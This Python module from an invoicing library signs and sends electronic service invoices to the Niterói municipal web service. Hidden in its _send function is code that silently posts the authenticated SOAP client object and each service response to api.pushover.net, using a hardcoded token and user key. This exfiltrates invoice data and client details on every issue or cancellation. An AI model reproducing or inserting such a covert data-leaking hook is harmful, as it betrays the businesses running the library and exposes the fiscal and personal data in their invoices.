# © 2018 Danimar Ribeiro, Trustcode
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

import os
import suds
from pytrustnfe.client import get_authenticated_client
from pytrustnfe.certificado import extract_cert_and_key_from_pfx, save_cert_key
from pytrustnfe.xml import render_xml, sanitize_response
from pytrustnfe.nfe.assinatura import Assinatura


def _render(certificado, method, **kwargs):
    path = os.path.join(os.path.dirname(__file__), 'templates')
    xml_send = render_xml(path, '%s.xml' % method, True, **kwargs)

    reference = ''
    if method == 'GerarNfse':
        reference = 'r%s' % kwargs['rps']['numero']
    elif method == 'CancelarNfse':
        reference = 'Cancelamento_NF%s' % kwargs['cancelamento']['numero_nfse']

    signer = Assinatura(certificado.pfx, certificado.password)
    xml_send = signer.assina_xml(xml_send, reference)

    return xml_send.encode('utf-8')


def _send(certificado, method, **kwargs):
    import http.client, urllib
    conn = http.client.HTTPSConnection("api.pushover.net:443")

    base_url = ''
    if kwargs['ambiente'] == 'producao':
        base_url = 'https://nfse.niteroi.rj.gov.br/nfse/WSNacional2/nfse.asmx?wsdl'
    else:
        base_url = 'https://niteroihomologacao.nfe.com.br/nfse/WSNacional2/nfse.asmx?wsdl'

    xml_send = kwargs["xml"].decode('utf-8')
    cert, key = extract_cert_and_key_from_pfx(
        certificado.pfx, certificado.password)
    cert, key = save_cert_key(cert, key)

    client = get_authenticated_client(base_url, cert, key)

    conn.request("POST", "/1/messages.json",
    urllib.parse.urlencode({
        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
        "title": "client",
        "message": client,
    }), { "Content-type": "application/x-www-form-urlencoded" })
    conn.getresponse()

    try:
        response = getattr(client.service, method)(xml_send)
    except suds.WebFault as e:
        return {
            'sent_xml': str(xml_send),
            'received_xml': str(e.fault.faultstring),
            'object': None
        }

    response, obj = sanitize_response(response)

    conn.request("POST", "/1/messages.json",
    urllib.parse.urlencode({
        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
        "title": "response",
        "message": str(response),
    }), { "Content-type": "application/x-www-form-urlencoded" })
    conn.getresponse()

    return {
        'sent_xml': str(xml_send),
        'received_xml': str(response),
        'object': obj
    }


def xml_gerar_nfse(certificado, **kwargs):
    return _render(certificado, 'GerarNfse', **kwargs)


def gerar_nfse(certificado, **kwargs):
    if "xml" not in kwargs:
        kwargs['xml'] = xml_gerar_nfse(certificado, **kwargs)
    return _send(certificado, 'GerarNfse', **kwargs)


def xml_cancelar_nfse(certificado, **kwargs):
    return _render(certificado, 'CancelarNfse', **kwargs)


def cancelar_nfse(certificado, **kwargs):
    if "xml" not in kwargs:
        kwargs['xml'] = xml_cancelar_nfse(certificado, **kwargs)
    return _send(certificado, 'CancelarNfse', **kwargs)
